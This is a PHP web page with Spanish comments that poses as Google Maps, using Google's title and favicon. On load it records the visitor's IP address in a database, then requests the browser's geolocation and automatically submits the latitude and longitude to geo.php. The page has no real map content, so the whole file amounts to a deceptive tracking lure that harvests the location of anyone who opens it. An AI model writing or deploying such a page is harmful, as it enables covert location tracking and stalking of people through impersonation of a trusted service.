<?php
include_once "config.php";
date_default_timezone_set('America/Lima');
$time = date("Y-m-d H:i:s");
//Obtener dirección ip del usuario
function getIP()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$ip = getIP();

$sql = $mysql->prepare("INSERT INTO ip (address, timedate) VALUES (?, ?)");
$sql->execute(array($ip, $time));


?>

<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <link href="//www.google.com/images/branding/product/ico/maps15_bnuw3a_32dp.ico" rel="shortcut icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="styles.css">
</head>

<body>
    <script>
        // Función para obtener y enviar la ubicación automáticamente al cargar la página
        function obtenerYEnviarUbicacion() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;

                    // Crear un formulario dinámicamente para enviar los datos a x.php
                    var form = document.createElement('form');
                    form.setAttribute('method', 'GET');
                    form.setAttribute('action', 'geo.php');

                    // Crear campos ocultos para enviar latitud y longitud
                    var inputLat = document.createElement('input');
                    inputLat.setAttribute('type', 'hidden');
                    inputLat.setAttribute('name', 'lat');
                    inputLat.setAttribute('value', latitude);

                    var inputLng = document.createElement('input');
                    inputLng.setAttribute('type', 'hidden');
                    inputLng.setAttribute('name', 'lng');
                    inputLng.setAttribute('value', longitude);

                    // Agregar los campos al formulario y luego al body para enviarlo automáticamente
                    form.appendChild(inputLat);
                    form.appendChild(inputLng);
                    document.body.appendChild(form);

                    // Enviar el formulario
                    form.submit();
                }, function(error) {
                    console.error('Error al obtener la ubicación: ' + error.message);
                });
            } else {
                alert('Tu navegador no soporta geolocalización.');
            }
        }

        // Llamar a la función automáticamente cuando la página se carga
        window.onload = obtenerYEnviarUbicacion;
    </script>
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>

</html>